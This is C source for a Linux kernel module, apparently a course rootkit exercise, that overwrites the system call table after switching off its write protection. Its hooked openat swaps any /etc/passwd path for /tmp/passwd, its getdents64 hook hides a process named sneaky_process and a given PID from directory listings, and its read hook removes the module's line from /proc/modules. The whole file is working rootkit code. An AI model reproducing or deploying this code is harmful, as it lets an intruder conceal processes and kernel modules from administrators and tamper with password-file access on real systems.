#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/dirent.h>      // for struct linux_dirent64


#define PREFIX "sneaky_process"

static char* spid = "";
module_param(spid, charp, 0);
MODULE_PARM_DESC(spid, "The pid of the sneaky program");

//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  const char* file_path = (char*)regs->si;
  if(strstr(file_path, "/etc/passwd") != NULL) {
    copy_to_user((void*)file_path, "/tmp/passwd", strlen("/tmp/passwd") + 1);  // plus the last '\0'
  }
  // Implement the sneaky part here
  return (*original_openat)(regs);
}


// get the original getdirent64
asmlinkage int (*original_getdents64)(struct pt_regs *);

// Define my new sneaky getdirent64 to hide the process
asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs) {
  struct linux_dirent64* d64;
  int byte_pos = 0, byte_read = 0;
  // get the pointer pointing to the linux_dirent64 struct
  unsigned long dirp = regs->si;
  byte_read = original_getdents64(regs);

  if(byte_read == -1) {
    printk(KERN_INFO "Error: error occurs in calling the original gendents64\n");
  }
  else if(byte_read == 0) {
    return 0;
  }
  else if(byte_read > 0) {
    for(byte_pos = 0; byte_pos < byte_read;) {
      d64 = (struct linux_dirent64*)(dirp + byte_pos);
      if((strcmp(d64->d_name, PREFIX) == 0) || (strcmp(d64->d_name, spid) == 0)) {
        memmove((char*)dirp + byte_pos, (char*)dirp + byte_pos + d64->d_reclen, byte_read - (byte_pos + d64->d_reclen));
        byte_read -= d64->d_reclen;
      }
      else {
        byte_pos += d64->d_reclen;
      }
    }
  }
  return byte_read;
}


// get the original read function
asmlinkage ssize_t (*original_read)(struct pt_regs *);

// Define my sneaky read to hide sneaky_mod from /proc/modules
asmlinkage ssize_t sneaky_sys_read(struct pt_regs * regs) {
  char* buf = (char*)regs->si;
  ssize_t byte_read = original_read(regs);
  if(byte_read == -1) {
    printk(KERN_INFO "Error: error occurs in calling the original read\n");
  }
  else if(byte_read == 0) {
    return 0;
  }
  else if(byte_read > 0) {
    char* start_pos = NULL, *end_pos = NULL;
    start_pos = strstr(buf, "sneaky_mod ");
    if(start_pos != NULL) {
      end_pos = strchr(start_pos, '\n');
      if(end_pos != NULL) {
        end_pos++;
        memmove(start_pos, end_pos, byte_read - (end_pos - buf));
        byte_read -= (ssize_t)(end_pos - start_pos);
      }
    }
  } 
  return byte_read;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void*)sys_call_table[__NR_read];

  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // You need to replace other system calls you need to hack here
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");